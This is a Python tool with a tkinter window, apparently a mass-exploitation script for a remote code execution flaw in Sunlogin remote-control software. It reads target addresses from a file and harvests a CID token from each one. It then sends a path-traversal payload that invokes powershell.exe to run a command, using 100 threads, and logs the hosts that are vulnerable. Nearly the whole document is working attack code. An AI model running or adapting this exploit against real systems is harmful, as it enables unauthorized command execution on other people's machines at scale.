import re, requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from ttkbootstrap.constants import *
def get_addr():
    with open("urls.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def xrk_rce(address):
    try:
        command = "ipconfig"
        url = 'http://%s/cgi-bin/rpc?action=verify-haras' % address
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
        }
        res_cid = requests.get(url)
        cid = re.findall('"verify_string":"(.*?)",', res_cid.text)
        payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"
        url = "http://" + address + payload
        xrk_text.insert(END, chars="[~~~]Start detection: " + unquote(url, "utf-8") + " \n")
        xrk_text.see(END)
        data = {
            'Host': address,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, defla te',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': 'CID=%s' % cid[0],
            'Cache-Control': 'max-age=0'
        }
        res = requests.get(url, headers=data, timeout=10)
        if "Windows IP" in res.text:
            xrk_text.insert(END, chars="[! ! ! ! ! ! ] Vulnerable url:" + unquote(url, "utf-8") + "\n")
            xrk_text.see(END)
            xrk_text.insert(END, chars=res.text + "\n")
            xrk_text.see(END)
            with open("[exists]xrk_RCE_url", "a+") as h:
                h.write("[exists]xrk_RCE_url: " + url)
            h.close()
    except Exception as e:
        xrk_text.insert(END, chars="【×××】" + unquote(url, "utf-8") + "has no vulnerability.\n")
        xrk_text.see(END)

def xrk_rce_gui():
    xrk_gui = Toplevel()
    xrk_gui.geometry("1035x455")
    xrk_gui.title("Sunlogin RCE [auto-muti-exp]")
    xrk_gui.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    xrk_gui.tk.call('wm', 'iconphoto', xrk_gui._w, logo)
    global xrk_text
    xrk_text = scrolledtext.ScrolledText(xrk_gui,width=122, height=24)
    xrk_text.grid(row=4, columnspan=3, padx=10, pady=10)
    xrk_text.see(END)
    addrs = get_addr()
    max_thread_num = 100
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(xrk_rce, addr)
    xrk_gui.mainloop()